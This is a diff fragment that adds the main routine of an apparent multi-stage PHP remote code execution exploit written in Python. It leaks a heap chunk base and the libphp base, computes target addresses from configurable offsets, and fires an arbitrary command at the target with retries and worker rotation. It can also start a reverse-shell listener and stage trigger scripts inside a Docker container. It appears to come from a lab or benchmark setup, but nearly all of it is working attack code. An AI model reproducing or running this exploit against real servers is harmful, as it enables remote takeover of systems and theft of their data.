+    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
+                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
+                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
+    t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
+    if local_offsets:
+        t.log(f"[*] offsets loaded from {args.offsets_file}")
+    t.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
+          f"htdata=0x{args.htdata_offset:x}")
+
+    def rotate_after_failure() -> None:
+        if not args.no_retry_rotate:
+            ex.rotate()
+
+    if not args.no_pre_rotate:
+        ex.rotate()
+
+    # ---- stage 1 ----
+    chunk = 0
+    for attempt in range(1, args.retries + 1):
+        t.log(f"[*] stage 1: heap leak (attempt {attempt}/{args.retries})")
+        chunk = ex.stage1()
+        if chunk:
+            t.log(f"[+] chunk base = 0x{chunk:x}")
+            break
+        t.log("[-] heap leak missed")
+        rotate_after_failure()
+    if not chunk:
+        print("HEAP_LEAK_FAILED", file=sys.stderr)
+        return 1
+    ex.rotate()  # each stage needs a fresh worker
+
+    # ---- stage 2 ----
+    libphp = 0
+    for attempt in range(1, args.retries + 1):
+        t.log(f"[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
+        libphp = ex.stage2()
+        if libphp:
+            t.log(f"[+] libphp base = 0x{libphp:x}")
+            break
+        t.log("[-] libphp leak missed")
+        rotate_after_failure()
+    if not libphp:
+        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
+        return 1
+    ex.rotate()
+
+    # ---- stage 3 ----
+    htdata = chunk + args.htdata_offset
+    zif = libphp + args.zif_offset
+    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")
+
+    # In shell mode the listener has to be up *before* the payload fires, or
+    # the target's callback finds a closed port and the shell is lost.
+    shell_thread = None
+    if args.shell:
+        ready = threading.Event()
+        shell_thread = threading.Thread(
+            target=serve_reverse_shell, args=(args.shell_port, ready), daemon=True)
+        shell_thread.start()
+        ready.wait(timeout=5)
+
+    # The command runs inside the target container, so `id>/out/p1` lands in
+    # the container's /out, never in the exploit repo. When the caller did not
+    # name a proof file, ask docker where /out is mounted so the default is the
+    # path that actually receives the write. (`--proof-file ''` still disables.)
+    container = container_for_url(args.url) or args.docker_container
+    if args.proof_file is None:
+        # Prefer the container that actually serves this URL; fall back to
+        # whatever --docker-container names.
+        resolved = resolve_local_proof(args.cmd, container)
+        if resolved:
+            args.proof_file = resolved
+            t.log(f"[*] proof path resolved from container {container}: {resolved}")
+        else:
+            args.proof_file = ""
+            t.log("[*] command writes no proof file; nothing to read back")
+
+    # If the command reads a staged script (`sh</out/r`), make sure it exists
+    # in the container before firing -- otherwise the command silently runs
+    # nothing and the only symptom is "no proof".
+    staged = stage_trigger_for_container(args.cmd, container, port=args.shell_port)
+    if staged:
+        t.log(f"[*] staged trigger: {staged}")
+
+    proof = ""
+    if args.proof_file:
+        try:
+            if os.path.exists(args.proof_file):
+                os.unlink(args.proof_file)
+        except OSError:
+            pass
+
+    # If there is nothing to read back (no proof file, no --fetch), the fire is
+    # blind: one shot is correct, and the caller's own out-of-band signal (a
+    # reverse-shell connection) is the real verdict. Looping would just print
+    # misleading "no proof yet" lines for a command that cannot produce proof.
+    if not args.proof_file and not args.fetch:
+        try:
+            ex.stage3(htdata, zif)
+        except OSError as e:
+            t.log(f"[-] request error: {e}")
+        if args.shell:
+            # Keep the process alive so the listener thread can serve the
+            # session; returning here would tear down the shell we just asked
+            # for. Join blocks until the session ends.
+            try:
+                shell_thread.join()
+            except KeyboardInterrupt:
+                pass
+            return 0
+        time.sleep(0.8)
+        print("FIRED (blind -- this command produces no proof file; "
+              "check your listener for the callback)", file=sys.stderr)
+        return 0
+
+    for attempt in range(1, args.retries + 3):
+        try:
+            ex.stage3(htdata, zif)
+        except OSError as e:
+            t.log(f"[-] request error: {e}")
+        time.sleep(0.8)
+
+        if args.proof_file:
+            try:
+                if os.path.exists(args.proof_file):
+                    with open(args.proof_file, "rb") as f:
+                        proof = f.read().decode("latin1").strip()
+            except OSError:
+                pass
+        if not proof and args.fetch:
+            status, body = t.get(args.fetch)
+            if status == 200:
+                proof = body.decode("latin1").strip()
+        if proof:
+            t.log(f"[+] W3 attempt {attempt}")
+            print(f"PROOF: {proof}")
+            return 0
+        t.log(f"[-] stage 3 attempt {attempt} no proof yet")
+        rotate_after_failure()
+
+    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
+          file=sys.stderr)
+    return 1
+
+
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        sys.exit(130)
